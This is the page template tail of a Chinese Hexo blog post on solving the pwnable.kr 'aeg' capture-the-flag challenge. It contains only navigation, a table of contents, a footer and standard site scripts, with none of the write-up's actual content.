    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            
    <div id="comment"></div>



        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2020/01/27/pwnable-kr-rootkit-未完全解/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">pwnable.kr rootkit 未完全解</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2019/12/19/需要读取maps和mem文件的pwn/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">需要读取maps和mem文件的pwn</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#何为AEG"><span class="post-toc-number">1.</span> <span class="post-toc-text">何为AEG</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#pwnable-kr-aeg"><span class="post-toc-number">2.</span> <span class="post-toc-text">pwnable.kr aeg</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#checksec"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">checksec</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#初步分析"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">初步分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sub-45658F0函数"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">sub_45658F0函数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用思路"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">利用思路</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#分析得到main函数的basic-blocks"><span class="post-toc-number">2.4.1.</span> <span class="post-toc-text">分析得到main函数的basic blocks</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#分析得到init-csu的gadget的地址"><span class="post-toc-number">2.4.2.</span> <span class="post-toc-text">分析得到init_csu的gadget的地址</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#分析得到加密后数据所在的地址"><span class="post-toc-number">2.4.3.</span> <span class="post-toc-text">分析得到加密后数据所在的地址</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#得到加密部分所异或的值"><span class="post-toc-number">2.4.4.</span> <span class="post-toc-text">得到加密部分所异或的值</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#进入套娃函数sub-45658F0"><span class="post-toc-number">2.4.5.</span> <span class="post-toc-text">进入套娃函数sub_45658F0</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#指令分析"><span class="post-toc-number">2.4.6.</span> <span class="post-toc-text">指令分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#预备操作"><span class="post-toc-number">2.4.6.1.</span> <span class="post-toc-text">预备操作</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析过程"><span class="post-toc-number">2.4.6.2.</span> <span class="post-toc-text">分析过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#代码"><span class="post-toc-number">2.4.6.3.</span> <span class="post-toc-text">代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">2.4.7.</span> <span class="post-toc-text">漏洞利用</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">3.</span> <span class="post-toc-text">总结</span></a></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>


</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="https://3nd.xyz/" target="_blank">3ND</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://blog.douluodalu.wang/" target="_blank">PwmHt</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                DaJun &copy; 2019 - 2020
            </span>
        		
           	
           	<span>
           		<a href="http://www.beian.miit.gov.cn" target="_blank">苏ICP备19059861号</a>
           	</span>
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/01/23/pwnable-kr-aeg自解/&title=《pwnable.kr aeg自解》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/01/23/pwnable-kr-aeg自解/&title=《pwnable.kr aeg自解》 — DaJun的Blog&source=最近想要学习自动化解题技术，于是选择了pwnable.kr的aeg一题进行学习" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3a0WrDMAwF0P3/T3cw9jAoTe+V00Gc46dSOscnAyFZ+vqK1+NnPX/z9/vnb2a/f7XDCQsDA+OyjMfhSg5x/LfJ4Z53zs+GgYFxH0ay9SvMyks53jM5GwYGBsYxaSXtm70mDAwMjOSRx6Xp8bHy4hYDAwNjlsxF2wVHaQvak2txDAyMCzLaxsB/fv5gfwMDA+MijEe58nQwedb6eX73wcDA2Jpx2lVXcN1/1lRIkeFiYGDcgJG0BGYthJUE9OXrwMDA2JqRbLo+itGG45VRDAwMjJ0Y+ZhXW76ul7IFCQMD4waMJNS28bttN+Zl7XBaBAMD47KMWaqXHDoP3HlTMzkJBgbGfoxZpduOba2nm29OgoGBsTWjbRbmAxZ5UtiG1zbpxMDAuDpjdvU/G9GYhdeoIYqBgXEDxixozoYwZoMaRYaLgYGxHWMWOj9Rsp7QkMDAwNiUkZSa7SNn3Ym2cH35f8DAwNiOkRyoKCbbrmn5Ot6kjBgYGLdhtKQkZWwv9WafMTAwdmXMepsrR1wfs8DAwMBoByZm4xTr4Tu6L8TAwNiC0Q6EtU3NdtiiPRUGBsYdGI9yrQxh5D3VujmKgYGxNSNfn25kRveCcVjHwMDYj7ESZPPwml/b5ddtdV8CAwPj4oy2KG1h7T7DUhYDA+P2jLq5GAfWE67tMDAwMIIE7tzAmqewGBgY92HkRWw+ztUOWCQJJQYGxj0ZbWMgAbQjFCspJgYGxtaMb6BE1ixjuhpnAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.4"></script>
    
    



<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.4"></script>



    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '(～﹃～)~zZ';
                clearTimeout(titleTime);
            } else {
                document.title = '(￣▽￣)';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
</body>
</html>
